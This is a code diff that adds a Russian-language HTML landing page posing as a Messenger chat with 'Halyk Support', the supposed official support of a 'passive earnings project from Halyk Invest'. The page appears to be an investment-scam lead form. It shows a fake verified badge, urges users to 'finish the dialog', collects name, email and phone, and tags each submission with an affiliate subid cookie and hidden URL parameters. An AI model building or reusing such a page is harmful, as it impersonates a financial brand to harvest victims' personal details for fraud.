@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="ru">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="facebook-domain-verification" content />
+    <meta name="robots" content="noindex, nofollow" />
+
+    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <meta http-equiv="Cache-Control" content="no-cache" />
+
+    <title>Halyk Support</title>
+
+    <link rel="icon" type="image/png" href="images/logo.png" />
+    <link rel="stylesheet" href="css/leadForm.css" />
+    <link rel="stylesheet" href="css/main.css" />
+    <link rel="stylesheet" href="css/form.css" />
+    <link rel="stylesheet" href="css/modal.css" />
+    <link rel="stylesheet" href="css/intlTelInput.min.css" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <style>
+      .countryFlag {
+        background-repeat: no-repeat;
+        background-position: 15% center;
+        height: 100%;
+      }
+    </style>
+
+    <!-- JS adapter -->
+    <script type="application/javascript">
+      function getCookie(name) {
+        var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
+        return v ? v[2] : null;
+      }
+
+      function setCookie(name, value, days) {
+        var d = new Date();
+        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
+        document.cookie = name + '=' + value + ';path=/;expires=' + d.toGMTString();
+      }
+
+      function getSubId() {
+        var params = new URLSearchParams(document.location.search.substr(1));
+        if (!'{subid}'.match('{')) {
+          return '{subid}';
+        }
+        var clientSubid = '<?php echo isset($client) ? $client->getSubid() : "" ?>';
+        if (clientSubid && !clientSubid.match('>')) {
+          return clientSubid;
+        }
+        if (params.get('_subid')) {
+          return params.get('_subid');
+        }
+        if (params.get('subid')) {
+          return params.get('subid');
+        }
+        if (getCookie('subid')) {
+          return getCookie('subid');
+        }
+      }
+
+      if (typeof URLSearchParams === 'function') {
+        document.addEventListener('DOMContentLoaded', function (event) {
+          var params = new URLSearchParams(document.location.search.substr(1));
+          var subid = getSubId();
+
+          setCookie('subid', subid);
+
+          // Adds params as hidden inputs to the forms
+          document.querySelectorAll('form').forEach(function (form) {
+            params.forEach(function (v, k) {
+              var input = document.createElement('input');
+              input.type = 'hidden';
+              input.name = k;
+              input.value = v;
+
+              form.append(input);
+            });
+          });
+        });
+      }
+    </script>
+    <!-- End JS adapter -->
+  </head>
+
+  <body class="add-scroll">
+    <div class="body" style="transform: translateY(0px)">
+      <div class="content">
+        <div class="header">
+          <div class="header__body">
+            <div class="header__name">
+              <div class="header__avatar">
+                <img src="images/logo.png" alt="" />
+              </div>
+              <div class="header__desc">
+                <div class="header__desc-title">
+                  <p>Halyk Support</p>
+                  <img src="images/meta-done.png" alt />
+                </div>
+                <p class="header__desc-text">Messenger</p>
+              </div>
+            </div>
+            <div class="header__modal">
+              <button type="button" data-modal-close>
+                <img src="images/btn-menu.png" alt />
+              </button>
+              <p>Чтобы связаться со специалистом, пройдите диалог до конца.</p>
+            </div>
+            <div class="header__icons">
+              <button type="button" data-modal>
+                <svg
+                  width="23"
+                  height="24"
+                  viewBox="0 0 23 24"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    clip-rule="evenodd"
+                    d="M9.37815 13.9919L9.5081 14.1218C11.7457 16.2882 13.6184 17.3056 15.1261 17.174L15.5605 16.7687C16.1785 16.2064 16.6444 15.85 16.9584 15.6994C17.612 15.3859 18.0707 15.3922 19.3094 16.0625C20.939 16.9442 22.0642 17.9691 22.6392 18.5441C23.1731 19.078 23.0072 19.9977 22.8197 20.4057L22.6955 20.6333C22.3619 21.2129 21.1521 23.1249 18.8334 23.4521C17.9523 23.5764 16.8399 23.4624 15.5357 23.0696C12.7419 22.1024 9.95981 20.3297 7.18932 17.7514L6.69661 17.2834L6.69197 17.288L6.45419 17.046L6.21199 16.808L6.21664 16.8034L5.74857 16.3107C3.17035 13.5402 1.39763 10.7581 0.430416 7.96428C0.0376067 6.66006 -0.0763732 5.54772 0.047946 4.66655C0.39822 2.18383 2.56566 0.972407 2.96871 0.746715L3.00964 0.723616C3.35849 0.522447 4.38095 0.285854 4.95591 0.860816L5.22814 1.14078C5.82079 1.76756 6.68177 2.79378 7.43755 4.19059C8.1078 5.42934 8.11405 5.88801 7.80058 6.54161C7.61655 6.92534 7.125 7.53612 6.32595 8.37394C6.19439 9.88161 7.21179 11.7543 9.37815 13.9919Z"
+                    fill="#0584FE"
+                  />
+                </svg>
+              </button>
+              <div style="cursor: pointer">
+                <svg
+                  width="28"
+                  height="18"
+                  viewBox="0 0 28 18"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    clip-rule="evenodd"
+                    d="M15.7 0C17.7987 0 19.5 1.7269 19.5 3.85714V14.1429C19.5 16.2731 17.7987 18 15.7 18H4.3C2.20132 18 0.5 16.2731 0.5 14.1429V3.85714C0.5 1.7269 2.20132 0 4.3 0H15.7ZM27.3658 4.02231C27.4538 4.17312 27.5 4.34278 27.5 4.5153V13.4849C27.5 14.0455 27.0224 14.5 26.4333 14.5C26.2521 14.5 26.0738 14.456 25.9153 14.3723L22.1858 12.4005C21.7625 12.1767 21.5 11.7521 21.5 11.2912V6.70894C21.5 6.24812 21.7625 5.82352 22.1858 5.59973L25.9153 3.62793C26.4303 3.35566 27.0797 3.53224 27.3658 4.02231Z"
+                    fill="#D2D2D2"
+                  />
+                </svg>
+              </div>
+            </div>
+          </div>
+        </div>
+        <form class="register-form main-flex" method="POST" id="formTop">
+          <div class="chat">
+            <div class="chat-absolute">
+              <div class="main__sup-logo">
+                <img src="images/logo.png" alt />
+              </div>
+              <div class="main__sup-subtitle">
+                Официальная поддержка пользователей проекта пассивного заработка от “Halyk Invest”
+              </div>
+              <p class="message-time"></p>
+            </div>
+            <div class="chat-content-list chat-content-list-1"></div>
+            <div class="user--name">
+              <div class="form-input-main">
+                <input
+                  type="text"
+                  class="form-input"
+                  name="first_name"
+                  id="first_name"
+                  placeholder="Имя"
+                  required
+                />
+              </div>
+              <div class="form-input-main">
+                <input
+                  type="text"
+                  class="form-input"
+                  name="last_name"
+                  id="last_name"
+                  placeholder="Фамилия"
+                  required
+                />
+              </div>
+              <button type="button" class="button--user button-name-next" data-btn-name>
+                Далее
+              </button>
+            </div>
+            <div class="chat-content-list chat-content-list-2"></div>
+            <div class="user--email">
+              <div class="form-input-main">
+                <input type="email" name="email" id="email" placeholder="E-mail" required />
+              </div>
+              <button type="button" class="button--user button-email-next" data-btn-email>
+                Далее
+              </button>
+            </div>
+            <div class="chat-content-list chat-content-list-3"></div>
+            <div class="user--phone">
+              <div class="form-input-main">
+                <div class="commonInputDiv">
+                  <div class="input-group mb-3">
+                    <input
+                      class="form-control localPhone"
+                      type="tel"
+                      id="phone1"
+                      name="phone1"
+                      placeholder=""
+                      autocomplete="off"
+                    />
+                  </div>
+                </div>
+              </div>
+
+              <button type="button" class="button--user button-phone-next" data-btn-phone>
+                Далее
+              </button>
+            </div>
+            <div class="chat-content-list chat-content-list-4"></div>
+            <div class="form--button hide">
+              <button name="submitBtn" type="submit">Приступить</button>
+            </div>
+            <div id="down-box"></div>
+          </div>
+          <div class="main__sup">
+            <div class="main__sup-logo">
+              <img src="images/logo.png" alt />
+            </div>
+            <div class="main__sup-title">
+              <p>Halyk Support</p>
+              <img src="images/meta-done.png" alt />
+            </div>
+            <div class="main__sup-subtitle">
+              Официальная поддержка пользователей проекта пассивного заработка от “Halyk Invest”
+            </div>
+            <div class="main__sup-btn">
+              <p>Связаться со специалистом</p>
+              <img src="images/logo.png" alt style="max-width: 100px" />
+            </div>
+            <p class="meta__sup-text">
+              Чтобы начать пользоваться программой вам необходимо закончить диалог с нами! Это
+              займёт у вас не больше 5 минут. Поверьте, выгода, которую вы получите того стоит.
+            </p>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- jquery -->
+    <script src="js/jquery.min-1.js"></script>
+    <script src="js/script.js"></script>
+    <!-- <script src="js/mycust.js"></script> -->
+
+    <style>
+      .error {
+        background-color: rgba(255, 0, 0, 0.5) !important;
+        color: #fff !important;
+      }
+
+      .error::placeholder {
+        color: #fff !important;
+      }
+
+      .valid {
+        background-color: rgba(0, 255, 0, 0.5) !important;
+      }
+
+      .modal_phone {
+        opacity: 1;
+        position: fixed;
+        top: 0;
+        bottom: 0;
+        right: 0;
+        left: 0;
+        z-index: 99999;
+        display: none;
+        outline: 0;
+        padding-right: 15px;
+        justify-content: center;
+        align-items: center;
+        background-color: rgba(0, 0, 0, 0.4);
+        overflow-x: hidden;
+        overflow-y: auto;
+        color: #000;
+      }
+
+      .modal_phone.open_phone {
+        display: flex;
+      }
+
+      .modal-open_phone {
+        overflow: hidden;
+      }
+
+      .modal-dialog_phone {
+        position: relative;
+        width: 100%;
+        max-width: 32rem;
+        padding: 1rem;
+        box-sizing: border-box;
+      }
+
+      .modal-content_phone {
+        display: flex;
+        flex-direction: column;
+        pointer-events: auto;
+        background-color: #fff;
+        background-clip: padding-box;
+        border: 1px solid rgba(0, 0, 0, 0.2);
+        border-radius: 0.3rem;
+        outline: 0;
+      }
+
+      .modal-header_phone {
+        display: flex;
+        align-items: center;
+        padding: 1rem 1rem;
+      }
+
+      .modal-header_phone {
+        justify-content: space-between;
+        border-top-left-radius: 0.3rem;
+        border-top-right-radius: 0.3rem;
+      }
+
+      .modal-body_phone {
+        position: relative;
+        flex: 1 1 auto;
+        padding: 1rem;
+      }
+
+      .modal-title_phone {
+        font-size: 1.25rem;
+        font-weight: 600;
+      }
+
+      .close-button_phone {
+        font-size: 1.5rem;
+        font-weight: 700;
+        line-height: 1;
+        opacity: 0.5;
+        background-color: transparent;
+        border: 0;
+        cursor: pointer;
+        padding: 1rem 1rem;
+        margin: -1rem -1rem -1rem auto;
+      }
+
+      label.error {
+        margin-top: 5px;
+        display: block;
+        padding: 5px;
+        border-radius: 10px;
+      }
+    </style>
+
+    <!-- <div id="modal_phone" class="modal_phone fade_phone" tabindex="-1">
+      <div class="modal-dialog_phone">
+        <div class="modal-content_phone">
+          <div class="modal-header_phone">
+            <h5 class="modal-title_phone">Неверный номер телефона</h5>
+            <button type="button" class="close-button_phone" id="close-button_phone">×</button>
+          </div>
+          <div class="modal-body_phone">
+            Извините! Программа не поддерживается в вашем регионе. Пожалуйста, введите свой
+            европейский номер
+          </div>
+        </div>
+      </div>
+    </div> -->
+
+    <!-- Start popup double -->
+    <div class="modal-form" id="modalFailure">
+      <p class="close-modal" href="#">&times;</p>
+      <div class="content">
+        <div class="sign-up-form-header text-center mb-4">
+          <h5 class="mb-2 mt-4">
+            Вы уже зарегистрировались на данный номер. Если вам нужен новый аккаунт, пройдите
+            регистрацию на другой мобильный номер
+          </h5>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal-form" id="modalFailureEmail">
+      <p class="close-modal" href="#">&times;</p>
+      <div class="content">
+        <div class="sign-up-form-header text-center mb-4">
+          <h5 class="mb-2 mt-4">
+            Вы уже зарегистрировались на данную электронную почту. Если вам нужен новый аккаунт,
+            пройдите регистрацию на другую электронную почту.
+          </h5>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal-form" id="modalInvalid">
+      <p class="close-modal" href="#">&times;</p>
+      <div class="content">
+        <div class="sign-up-form-header text-center mb-4">
+          <h5 class="mb-2 mt-4">
+            Вы ввели неккоректную электронную почту. Пройдите регистрацию на другую электронную
+            почту.
+          </h5>
+        </div>
+      </div>
+    </div>
+    <!-- End popup double -->
+
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/checkCookiePhone.js"></script>
+    <script src="js/jquery.validate.js"></script>
+    <script src="js/intlTelInput.min.js"></script>
+    <script src="js/jquery.maskedinput.js"></script>
+    <script src="js/modal.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/submitForm.js"></script>
+    <script src="js/utm.js"></script>
+    <script src="js/utils.js"></script>
+  </body>
+</html>
